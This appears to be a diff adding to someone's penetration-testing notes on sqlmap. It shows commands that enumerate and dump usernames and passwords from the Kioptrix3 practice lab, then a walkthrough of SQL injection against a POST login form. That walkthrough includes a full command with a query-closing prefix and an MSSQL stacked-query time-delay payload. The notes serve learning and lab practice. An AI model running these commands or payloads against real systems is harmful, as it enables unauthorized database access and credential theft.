@@ -4,3 +4,48 @@ sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -p
 sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -p id -D gallery --tables
 sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -p id -D gallery -T dev_accounts --columns
 sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -p id -D gallery -T dev_accounts -C username,password --dump
+
+
+
+
+
+Injection Post Parameter
+
+Notes for sqlmap and POST requests since every f**king tutorial only covers GETs
+
+options you'll want to use
+
+-u URL, --url=URL <-- Target url
+--method=METHOD <-- HTTP method, GET or POST (default GET)
+--data=DATA <-- Data string to be sent through POST
+-p TESTPARAMETER <-- Testable parameter(s)
+--prefix=PREFIX <-- Injection payload prefix string
+
+--postfix=POSTFIX <-- Injection payload postfix string
+
+--dbms=DBMS <--Force back-end DBMS to this value
+
+*--dbms= if sqlmap is sucking
+
+we'll assume we have a simple post request
+
+
+sqlmap -u "http://192.168.1.1/test/login.aspx" --method POST --data "usernameTxt=blah&passwordTxt=blah&submitBtn=Log+On" -p "usernameTxt" --prefix="')" --dbms=mssql -v 2
+
+--method to pass the POST option
+
+--data to pass the paramaters that are required for the POST
+
+-p to pass the injectable field, so in this case the username field (usernameTxt)
+
+--prefix to pass what needs to be passed before we can inject. we had to issue a tick ( ' ) and right parenthesis ( ) ) to close out the query
+
+--dbms to tell it the backend was mssql
+
+this yields us an sqlmap query like so:
+
+Place: POST
+Parameter: usernameTxt
+Type: stacked queries
+Title: Microsoft SQL Server/Sybase stacked queries
+Payload: usernameTxt=blah'); WAITFOR DELAY '0:0:5';-- AND ('yTwo'='yTwo&passwordTxt=blah&submitBtn=Log+On
